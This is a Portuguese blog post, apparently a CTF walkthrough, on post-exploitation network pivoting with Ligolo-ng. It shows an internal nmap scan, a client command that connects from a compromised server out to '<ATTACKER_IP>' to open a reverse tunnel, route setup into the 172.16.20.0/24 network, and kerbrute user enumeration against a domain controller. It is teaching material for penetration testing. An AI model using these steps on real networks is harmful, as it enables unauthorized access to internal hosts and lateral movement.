---
layout: post
title: Network Pivoting
date: 2025-03-01 
description: pivotando
categories: network windows bhatagem
---


## Network Pivoting

#### Network Pivoting é uma técnica de pós-exploração usada para acessar a rede de maquinas comprometidas...

Exemplificando, vamos supor o seguinte cenario: 

#### Um atacante explora alguma vulnerabilidade em uma aplicação web e consegue acesso ao shell do server em que a aplicação está rodando. Depois de conseguir o acesso e fazer um recon local, o atacante percebe que esse server está numa borda entre a internet e a uma rede interna onde estão outros serividores e maquinas que o server comprometido pode acessar. Essa rede do server é uma rede DMZ (demilitarized zone) que é uma sub-net (geralmente atras de um firewall) isolada do resto da rede interna e também a unica parte da rede que é acessivel pela internet.

{% include figure.liquid loading="eager" path="assets/img/net-pivot-2.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


#### Sabendo disso o atacante tem algumas opções, duas delas são: 
#### 1 - Continuar a pós-exploração usando o server comprometido para ter acesso a rede interna (e pra isso ele vai ter que "upar" as tools no server e usa-las atravez dele).
#### 2 - Pode abrir um tunel entre o server e a maquina local para ter um acesso direto a rede interna do target.

#### Obviamente opção 2.

#### Agora que vocês estão contextualizados vamos para a parte pratica da coisa.

### 1 - Depois da shell

Para não prolongar muito vou pular logo pra parte em que ja temos acesso ao shell da maquina comprometida. Nesse exemplo retirado de um ctf, a acesso foi pelo vazamento das credenciais ssh usadas por um dev para acessar o web-server de produção.

Podemos ver que a interface de rede eth0 do server tem um ip de faixa reservado para ser usado em LAN (https://whatismyipaddress.com/reserved-ip-address-blocks). E esse ip está em uma sub-net /24, ou seja, ja sabemos quantas possibilidades de ip temos, então podemos fazer um simples scan para achar mais hosts ativos naquela sub-net.


{% include figure.liquid loading="eager" path="assets/img/ipa.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


Fazendo um scan no range local /24 vemos que existem mais dois hosts ativos. Pelas portas abertas nesses hosts é possivel afirmar que são hosts windows, um deles é um Active Directory.

(eu simplesmente upei o binario do nmap no server pra facilitar o scan e mostrar tudo aqui)


```
nmap -v -T5 172.16.20.0/24

Nmap scan report for DC-01 (172.16.20.1)
Host is up (0.0020s latency).
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
443/tcp open  https
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps

Nmap scan report for 172.16.20.2
Host is up (0.0013s latency).
Not shown: 1152 closed ports
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  epmap
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap scan report for 172.16.20.3
Host is up (0.00013s latency).
Not shown: 1154 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

#### Ok, vamos ver o que temos:

```
172.16.20.1 - Actve Directory

172.16.20.2 - web-server windows IIS

172.16.20.3 - é o próprio server linux em que estamos
```

#### Agora temos certeza de que o server linux comprometido pode acessar diretamente outros hosts na rede interna, vamos para a pivotagem.


## 2 - Pivoting (pivotando ou pivotagem)

Se você pesquisar por "network pivoting" vai achar varias tools que possibilitam abrir tuneis atravez de redes comprometidas. Algumas aproveitam de conexões ssh para fazer ```port forwarding```, outras usam ```socks proxy``` entre um server e um client, e com essas tools é realmente possivel fazer pivot, mas aqui vamos ver uma tecnica diferente que é tão eficaz quanto as outras.

Nesse exemplos usaremos a tool Ligolo-ng.

- https://github.com/nicocha30/ligolo-ng
"Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS)."

O que o ligolo-ng faz de diferente é usar "userland network stack" e cria uma interface de rede virtual que é usada entre o client e server agent. O Ligolo-ng utiliza a interface TUN para redirecionar pacotes de rede entre o client e o server, criando um túnel virtual entre as máquinas. Nesse caso o client é usado na maquina alvo e o server é "startado" na maquina do atacante. (ref no fim da pág)


#### ligolo setup

Seguindo o quickstart na documentação é bem simples.
- https://docs.ligolo.ng/Quickstart/

Em releases https://github.com/nicocha30/ligolo-ng/releases faça download dos binarios client e server, depois descompacte:


{% include figure.liquid loading="eager" path="assets/img/clienteserver.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


Com os binarios descompactados temos o ```client``` que precisa esta na maquina alvo e o ```proxy``` que é o server. 


(Para enviar o client para a maquina alvo você pode um server http python ou, como temos credenciais ssh, podemos usar scp. Essa parte fica por conta do cenario que o pivot será feito.)


#### 1 - inicie o server na maquina do atacante

```$ sudo ./proxy -serlfcert```

O server precisa ser iniciado com sudo porque o ligolo criar interface de rede e rotas na maquina.

{% include figure.liquid loading="eager" path="assets/img/startserver.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


#### 2 - inicie o client na maquina comprometida

```$ ./client -connect <ATTACKER_IP>:11601 --accept-fingerprint <SERVER_FINGERPRINT>```

Usando o ip da maquina do atacante e a porta padrão que o server usa ao inicar, junto com o fingerprint do server pra usar o certificado TLS self-signed que o server gera.


{% include figure.liquid loading="eager" path="assets/img/startclient.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


Depois de rodar o comando você recebe a confirmação de que o client se conectou ao server logo abaixo. E no terminal com o server rodando, também vemos que uma sessão foi iniciada a partir do client.


{% include figure.liquid loading="eager" path="assets/img/clientconnected.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


Selecione a sessão com o comando ```session``` e o número da sessão


{% include figure.liquid loading="eager" path="assets/img/selectsession.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


#### 3 - Com o client e o server conectados, crie a tun interface que vai ser usado pelo ligolo

``` interface_create --name <NAME> ```

(você pode usar o nome que quiser. nessa demo eu usei o nome "pivot")


{% include figure.liquid loading="eager" path="assets/img/createinterface.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


Confirme que a interface foi criada na maquina listando todas elas:


{% include figure.liquid loading="eager" path="assets/img/ifconfig.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


#### 4 - Starte o tunel usando a interface tun criada

``` tunnel_start --tun <INTERFACE_NAME> ```


{% include figure.liquid loading="eager" path="assets/img/tunnelstart.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


#### 5 - Set a rota da rede alvo

``` interface_route_add --name <INTERFACE_NAME> --route 172.16.20.0/24 ```


{% include figure.liquid loading="eager" path="assets/img/createroute.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


O range de ip que você vai usar depende de qual range a rede alvo usa, se é 192.168.x.x ou 10.10.x.x. Na maquina dessa demo o é range 172.16.20.0/24, como vimos la em cima. 


Confirme que a rota e o ip está correto no próprio shell do server ligolo

``` route_list ```


{% include figure.liquid loading="eager" path="assets/img/routelist.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


``` ifconfig ```


{% include figure.liquid loading="eager" path="assets/img/ligoloifconfig.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


#### 6 - Depois de setar o rota e verificar se está tudo certo, ja temos acesso a rede interna do maquina comprometida

Pingando os ips da rede interna do alvo

{% include figure.liquid loading="eager" path="assets/img/ping1.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


{% include figure.liquid loading="eager" path="assets/img/ping2.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


Podemos alcançar os hosts da rede alvo a partir da maquina local do atacante

Nmap scan do AD server e enumeração de usarios com kerbrute

{% include figure.liquid loading="eager" path="assets/img/nmapscan.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


{% include figure.liquid loading="eager" path="assets/img/kerbrute.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


#### Resumindo, um atacante obteve acesso a uma rede interna atravez de um web-server comprometido, tendo a possibilidade de alcançar hosts que deveriam ser acessiveis pelo pessoal autorizado naquela rede. 


{% include figure.liquid loading="eager" path="assets/img/net-pivot-3.png" width="500" height="500" class="img-fluid rounded z-depth-1" zoomable=true %}


#### Essa foi uma simples demonstração de como é pivotar entre redes comprometidas com facilidade tornando possével realizar movimentação lateral entre os hosts, escalar privilégios e mais...




#### Refs 
- https://docs.ligolo.ng/
- https://www.youtube.com/watch?v=qou7shRlX_s
- https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/
- metasploit pivoting - https://pentest.blog/explore-hidden-networks-with-double-pivoting/


- IA text
```
"Userland network stack" 
refere-se a uma pilha de rede (network stack) que é implementada no espaço de usuário (userland) em vez de ser implementada no espaço do kernel do sistema operacional.

Normalmente, em um s.o tradicional, a pilha de rede (responsável por gerenciar o tráfego de rede, como TCP/IP) é parte do núcleo (kernel)... enviar e receber pacotes de dados, acontecem no contexto do kernel, que tem privilégios elevados para manipular diretamente o hardware e o tráfego de rede.

"userland network stack" coloca a pilha de rede no espaço de usuário, ou seja, em uma camada mais alta do sistema, fora do núcleo. Isso significa que o processamento das comunicações de rede não é realizado diretamente no kernel, mas em um programa que é executado em modo de usuário.


"TUN interface"
TUN (Network TUNnel) é uma interface de rede virtual que opera na camada de rede (camada 3 do modelo OSI). Ela é usada para enviar e receber pacotes de rede em forma de pacotes IP. O TUN é geralmente usado para criar VPNs (Virtual Private Networks) e outros tipos de redes virtuais.
A interface TUN cria uma conexão de rede virtual que o sistema operacional pode tratar como se fosse uma interface de rede real (como uma interface de rede física), mas em um contexto de espaço de usuário.

```

